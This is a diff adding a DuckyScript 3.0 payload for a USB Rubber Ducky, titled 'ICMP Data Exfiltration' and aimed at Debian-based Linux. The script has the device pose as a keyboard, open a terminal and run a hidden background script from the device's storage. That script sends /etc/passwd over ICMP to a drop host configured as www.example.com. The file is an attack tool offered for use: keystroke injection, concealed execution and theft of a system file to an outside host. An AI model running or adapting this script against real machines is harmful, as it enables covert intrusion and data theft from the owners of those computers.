@@ -1,0 +1,44 @@
+REM TITLE : ICMP Data Exfiltration
+REM AUTHOR : TW-D
+REM TARGET : Debian-Based Linux Distributions
+REM VERSION : 1.0
+REM CATEGORY : Exfiltration
+REM REQUIREMENT : DuckyScript 3.0
+
+ATTACKMODE HID STORAGE
+DELAY 15000
+
+REM ---
+REM USB Rubber Ducky label.
+REM ---
+DEFINE #RD_LABEL DUCKY
+
+REM ---
+REM Absolute path of the file to be exfiltrated.
+REM ---
+DEFINE #TARGET_FILE /etc/passwd
+
+REM ---
+REM IP address or domain receiving ICMP packets.
+REM ---
+DEFINE #DROP_HOST www.example.com
+
+SAVE_HOST_KEYBOARD_LOCK_STATE
+
+IF ( $_CAPSLOCK_ON ) THEN
+    CAPSLOCK
+    DELAY 500
+END_IF
+
+IF ( $_NUMLOCK_ON == FALSE ) THEN
+    NUMLOCK
+    DELAY 500
+END_IF
+
+CTRL-ALT t
+DELAY 2000
+STRINGLN  nohup "${BASH}" /media/"${USER}"/#RD_LABEL/payload.sh #TARGET_FILE #DROP_HOST &> /dev/null
+DELAY 1500
+STRINGLN exit
+
+RESTORE_HOST_KEYBOARD_LOCK_STATE
